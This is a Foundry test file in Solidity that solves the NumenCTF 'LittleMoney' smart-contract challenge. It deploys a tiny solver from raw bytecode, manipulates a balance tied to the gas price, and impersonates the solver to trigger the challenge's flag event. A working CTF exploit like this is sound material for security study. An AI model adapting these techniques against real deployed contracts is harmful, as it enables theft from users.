// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./challenge/NumenCTF.sol";
// import "foundry-huff/HuffDeployer.sol";

contract ExploitTest is Test {
    event SendFlag(address indexed sender);
    function test() public {
        // address solverAddress = HuffDeployer.deploy("NumenCTF/LittleMoney/Solver");
        address solverAddress;
        bytes memory bytecode = hex"600c80600c3d39f3436000523a31602052604060fd";
        assembly {
            solverAddress := create(0, add(bytecode, 0x20), mload(bytecode))
        }
        address numenAddress = 0xAAe09f3ACe9dB43b7bBb231815eA010603c80C2e;
        require(solverAddress.code.length <= 12);

        vm.etch(
            numenAddress,
            hex"6080604052600436106100385760003560e01c80634b64e4921461004457806380e10aa514610066578063b15be2f51461006e57600080fd5b3661003f57005b600080fd5b34801561005057600080fd5b5061006461005f366004610300565b610083565b005b61006461018e565b34801561007a57600080fd5b5061006461022a565b6040805163bfa814b560e01b602082015282916000916001600160a01b038416910160408051601f19818403018152908290526100bf91610330565b600060405180830381855af49150503d80600081146100fa576040519150601f19603f3d011682016040523d82523d6000602084013e6100ff565b606091505b5050905080156101425760405162461bcd60e51b81526020600482015260096024820152686e6f20636f7665722160b81b60448201526064015b60405180910390fd5b60008061014d610251565b909250905043821461015e57600080fd5b604080516020810190915261022a820180825261017d9063ffffffff16565b5050505061018a81610280565b5050565b6000546001600160a01b031633146101a557600080fd5b346001146101f55760405162461bcd60e51b815260206004820152601b60248201527f49206f6e6c79206e6565642061206c6974746c65206d6f6e65792100000000006044820152606401610139565b6040513381527f2d3bd82a572c860ef85a36e8d4873a9deed3f76b9fddbf13fbe4fe8a97c4a5799060200160405180910390a1565b6000546001600160a01b031661023f57600080fd5b600080546001600160a01b0319169055565b60008060403d1461026157600080fd5b60405160406000823e63ffffffff815116925080602001519150509091565b600061028b826102dc565b9050806102c75760405162461bcd60e51b815260206004820152600a6024820152693832b936b4b9b9b4b7b760b11b6044820152606401610139565b336001600160a01b0383161461018a57600080fd5b6000813b806102ee5750600092915050565b600c8111156100645750600092915050565b60006020828403121561031257600080fd5b81356001600160a01b038116811461032957600080fd5b9392505050565b6000825160005b818110156103515760208186018101518583015201610337565b81811115610360576000828501525b50919091019291505056fea2646970667358221220f9b740c6afb3d0144cfc4fde3b00baa8b2e5d087e61ef21d572db9ba3095d36a64736f6c634300080c0033"
        );

        // address playerAddress = makeAddr("player");
    Numen numen = Numen(payable(numenAddress));
        // vm.deal(playerAddress, 1 ether);

        // vm.startPrank(playerAddress, playerAddress);
    address gasPriceAddress = 0x000000000000000000000000000000003B9aCA00;
    // Fund the gasPrice address with the precomputed value so balance(gasprice()) == 0xffffffcb
    vm.deal(address(gasPriceAddress), 4294967243);

    // Expect the SendFlag event to be emitted with solverAddress as the sender
    vm.expectEmit(true, false, false, false);
    emit SendFlag(solverAddress);

    // Call execute as if from the solverAddress so permission(msg.sender == addr) passes
    vm.prank(solverAddress);
    numen.execute(solverAddress);
        // vm.stopPrank();
    }
}
